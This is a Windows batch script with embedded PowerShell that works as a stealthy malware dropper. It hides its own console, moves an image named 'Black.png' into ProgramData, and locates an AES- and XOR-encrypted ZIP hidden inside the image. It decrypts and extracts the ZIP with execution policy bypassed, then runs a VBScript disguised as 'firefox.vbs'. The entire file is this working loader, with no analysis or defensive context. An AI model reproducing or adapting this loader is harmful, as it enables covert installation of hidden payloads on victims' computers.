@echo off
setlocal EnableDelayedExpansion

:: Hide console
if "%~1" neq "x" (
    powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -ArgumentList 'x' -WindowStyle Hidden"
    exit /b
)

:: Path aliases
set "a=%ProgramData%"
set "b=Black.png"
set "r=%random%%random%"
set "c=%a%\firefox_!r!.zip"
set "d=%a%\firefox.vbs"

:: Move image to public
powershell -NoProfile -WindowStyle Hidden -Command "[io.file]::Move('%~dp0%b%', '%a%\%b%')" >nul 2>&1
if not exist "%a%\%b%" (
    pause
    exit /b
)

:: Decrypt and extract ZIP from image
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
 "$f='%a%\%b%';$pwd='fdsf5F54GFL';" ^
 "$d=[IO.File]::ReadAllBytes($f);" ^
 "$pwdHash=[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($pwd));" ^
 "$found=$false;$i=0;" ^
 "for($x=$d.Length-1;$x -ge 50;$x--){" ^
 " $marker=$d[($x-49)..($x-40)];" ^
 " $verifyMarker=$d[($x-39)..($x-30)];" ^
 " $valid=$true;" ^
 " for($v=0;$v -lt 10;$v++){if((($marker[$v] -bxor $pwdHash[$v]) -band 0xFF) -ne $verifyMarker[$v]){$valid=$false;break}}" ^
 " if($valid){$i=$x-49;$found=$true;break}" ^
 "};" ^
 "if(-not $found){exit 1};" ^
 "$marker=$d[$i..($i+9)];" ^
 "$xorKey=[BitConverter]::ToInt32($d, $i+20);" ^
 "$salt=$d[($i+24)..($i+39)];" ^
 "$iv=$d[($i+40)..($i+55)];" ^
 "$len=[BitConverter]::ToInt32($d, $i+56);" ^
 "$start=$i+60;" ^
 "$enc=$d[$start..($start+$len-1)];" ^
 "$derive=New-Object Security.Cryptography.Rfc2898DeriveBytes($pwd, $salt, 10000);" ^
 "$key=$derive.GetBytes(32);" ^
 "$aes=[Security.Cryptography.Aes]::Create();$aes.KeySize=256;$aes.Key=$key;$aes.IV=$iv;$aes.Mode='CBC';$aes.Padding='PKCS7';" ^
 "$xorDec=$aes.CreateDecryptor().TransformFinalBlock($enc, 0, $enc.Length);" ^
 "$zipBytes=New-Object byte[] $xorDec.Length;" ^
 "for($j=0;$j -lt $xorDec.Length;$j++){$zipBytes[$j]=($xorDec[$j] -bxor $xorKey) -band 0xFF};" ^
 "[IO.File]::WriteAllBytes('%c%', $zipBytes);"

:: Check ZIP exists
if not exist "%c%" (
    pause
    exit /b
)

:: Validate ZIP file
powershell -NoProfile -WindowStyle Hidden -Command "try { Add-Type -AssemblyName 'System.IO.Compression.FileSystem'; $zip = [IO.Compression.ZipFile]::OpenRead('%c%'); $zip.Dispose() } catch { exit 1 }"
if %errorlevel% neq 0 (
    pause
    exit /b
)

:: Extract ZIP
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try { Expand-Archive -Path '%c%' -DestinationPath '%a%' -Force } catch { exit 1 }"
if %errorlevel% neq 0 (
    pause
    exit /b
)

:: Run script if found
if exist "%d%" (
    wscript "%d%"
) else (
    pause
    exit /b
)